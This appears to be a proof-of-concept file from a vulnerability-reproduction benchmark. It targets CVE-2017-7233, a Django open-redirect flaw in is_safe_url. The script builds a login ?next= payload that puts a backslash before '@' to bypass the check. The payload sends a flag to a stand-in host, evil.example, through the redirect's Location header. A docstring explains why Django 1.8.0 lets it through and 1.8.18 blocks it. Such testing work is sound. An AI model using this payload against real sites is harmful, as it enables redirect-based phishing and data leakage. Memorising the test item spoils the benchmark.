#!/usr/bin/env python3
r"""[RESIDUAL] CVE-2017-7233 open-redirect PoC for django-openredirect-2015-2317-2017-7233
（heldout 语义内嵌，不引用 hidden 文件）。

The CVE-2015-2317 fix in V1 (Django 1.8.0) rejects leading control chars, but is_safe_url() only
validates the backslash-NORMALISED url: `next = http://app.local\@<FLAG>.evil.example` becomes
`http://app.local/@...` after url.replace('\\','/'), so netloc == app.local == host -> APPROVED and
the login view 302-redirects with the FLAG in the Location header (browsers read app.local as
userinfo and land on the attacker host). On V2 (1.8.18) the fix also validates the RAW url ->
netloc `app.local\@<FLAG>...` != host -> BLOCKED.

Same sink (is_safe_url gate on ?next= in the real `go` view) and same flag channel (Location header)
as the seed -> Variant A.
"""
from __future__ import annotations


def candidate(flag: str) -> dict:
    """A GET /login whose ?next= uses the backslash-before-@ trick."""
    return {
        "probe_id": "cve-2017-7233-backslash-userinfo",
        "method": "GET",
        "path": "/login",
        "next": f"http://app.local\\@{flag}.evil.example",
    }


if __name__ == "__main__":
    # 平台约定：stdout 输出 JSON candidate；flag 以 PCBFLAG_ 占位符形式给出，
    # verify.sh 随后把 PCBFLAG_[A-Za-z0-9_]+ 替换为 per-run RUN_FLAG。
    import json
    import sys
    _ = sys.argv
    print(json.dumps(candidate("PCBFLAG_demo")))
